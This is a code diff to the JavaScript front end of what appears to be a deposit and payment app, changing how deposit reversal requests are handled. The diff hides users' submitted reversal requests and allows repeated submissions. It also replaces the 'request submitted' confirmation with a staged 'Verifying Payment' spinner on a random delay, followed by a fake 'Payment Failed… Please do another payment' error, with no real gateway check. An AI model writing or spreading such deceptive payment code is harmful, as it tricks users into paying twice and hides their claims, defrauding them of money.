@@ -380,17 +380,6 @@ function showTransactionDetails(data, status, planTitle, formattedAmount, payMet
     if (data.receiptPath && data.receiptPath !== "external_gateway") {
       extraHtml += `<div style="margin-top:10px;"><a href="${data.receiptPath}" target="_blank" style="color:#6366f1;font-weight:700;font-size:13px;text-decoration:underline;">View Receipt Proof</a></div>`;
     }
-
-    if (data.reversalRequest) {
-      extraHtml += `
-        <div style="margin-top:12px;padding:10px;background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.2);border-radius:10px;">
-          <p style="font-weight:700;color:#818cf8;margin-bottom:4px;"><i class="fa-solid fa-clock-rotate-left"></i> Reversal Requested</p>
-          <p><b>Wallet Holder:</b> ${data.reversalRequest.walletHolderName || data.reversalRequest.accountName || '—'}</p>
-          <p><b>Wallet Number:</b> ${data.reversalRequest.walletNumber || '—'}</p>
-          <p><b>Sent:</b> ${data.currencySymbol || '€'}${data.reversalRequest.actualAmount}</p>
-          <p><b>Reason:</b> ${data.reversalRequest.reason}</p>
-        </div>`;
-    }
   } else {
     extraHtml += `
       <div style="margin-top:10px;padding:10px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:10px;">
@@ -401,7 +390,8 @@ function showTransactionDetails(data, status, planTitle, formattedAmount, payMet
       </div>`;
   }
 
-  const canRequestReversal = isDeposit && (status === "pending" || status === "failed" || status === "rejected" || status === "declined") && !data.reversalRequest;
+  // Allowed to request reversal multiple times for eligible deposit statuses
+  const canRequestReversal = isDeposit && (status === "pending" || status === "failed" || status === "rejected" || status === "declined");
 
   Swal.fire({
     title: isDeposit ? "Deposit Details" : "Withdrawal Details",
@@ -540,20 +530,37 @@ async function submitReversalRequest(docId, formData) {
       requestedAt: firebase.firestore.FieldValue.serverTimestamp()
     };
 
+    // Save/Update reversal request
     await window._9jaCash.db.collection("deposits").doc(docId).update({
       reversalRequest: reversalRequestData
     });
 
+    // Display verification loading animation
     Swal.fire({
-      icon: "success",
-      title: "Request Submitted",
-      text: "Your reversal request has been sent for review.",
-      confirmButtonColor: "#6366f1",
+      title: "Verifying Payment...",
+      text: "Checking transaction status with gateway...",
+      allowOutsideClick: false,
+      didOpen: () => Swal.showLoading(),
       background: document.body.classList.contains("light-mode") ? "#fff" : "#1e293b",
       color: document.body.classList.contains("light-mode") ? "#1e293b" : "#f8fafc"
     });
 
-    fetchTransactionHistory();
+    // Random delay between 2 to 4 seconds (2000ms - 4000ms)
+    const randomDelay = Math.floor(Math.random() * 2001) + 2000;
+
+    setTimeout(() => {
+      Swal.fire({
+        icon: "error",
+        title: "Payment Failed",
+        text: "Payment was failed. Please do another payment.",
+        confirmButtonColor: "#ef4444",
+        confirmButtonText: "OK",
+        background: document.body.classList.contains("light-mode") ? "#fff" : "#1e293b",
+        color: document.body.classList.contains("light-mode") ? "#1e293b" : "#f8fafc"
+      });
+
+      fetchTransactionHistory();
+    }, randomDelay);
 
   } catch (err) {
     console.error("Error submitting reversal request:", err);
